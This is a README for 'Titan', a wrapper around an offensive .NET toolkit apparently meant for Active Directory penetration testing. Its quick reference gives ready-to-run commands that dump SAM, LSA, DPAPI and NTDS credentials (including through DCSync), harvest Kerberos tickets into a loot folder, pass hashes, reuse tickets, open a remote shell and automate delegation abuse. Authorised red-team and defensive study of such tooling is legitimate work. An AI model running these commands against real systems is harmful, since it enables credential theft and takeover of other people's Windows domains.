# Titan

Wrapper for [Titanis](https://github.com/trustedsec/Titanis) .NET toolkit.  

## Install

```bash
git clone git@github.com:mattmillen15/Titan.git ~/workspace/titan
```
```bash
bash install.sh
```

## Quick reference

```bash
# Dump SAM + LSA
titan dump ECORP/user:'pass'@192.168.15.40

# Dump everything including DPAPI (browsers, WiFi, WAM tokens, CredMan)
titan dump -A --dpapi -u user -d ECORP -p 'pass' -t 192.168.15.40

# DCSync
titan dump --ntds -u user -d ECORP -p 'pass' -dc-ip 192.168.15.40 -t 192.168.15.40

# Kerberos ccache
KRB5CCNAME=admin.ccache titan dump -k -no-pass -t dc01.ecorp.local

# ntlmrelayx --socks relay
proxychains titan dump -u administrator -d ECORP --no-pass -t 192.168.15.40

# Interactive shell
titan shell ECORP/user:'pass'@192.168.15.42

# RBCD full auto
titan rbcd full --delegate-to ECORP-DC$ ECORP/user:'pass'@192.168.15.40

# Dump all Kerberos TGTs → ccache files (requires Tsch binary)
titan klist ECORP/user:'pass'@192.168.15.40
titan klist -u user -d ECORP --hash :NThash -t 192.168.15.40 -o ./loot/
KRB5CCNAME=admin.ccache titan klist -k -no-pass -K dc01.ecorp.local -t dc01.ecorp.local

# Use a dumped TGT for follow-on actions
export KRB5CCNAME=./loot/Administrator@ECORP.LOCAL_0x3e4.ccache
titan dump -k -no-pass --ntds -dc-ip dc01.ecorp.local -t dc01.ecorp.local
```

→ **[Full usage docs](../../wiki)**
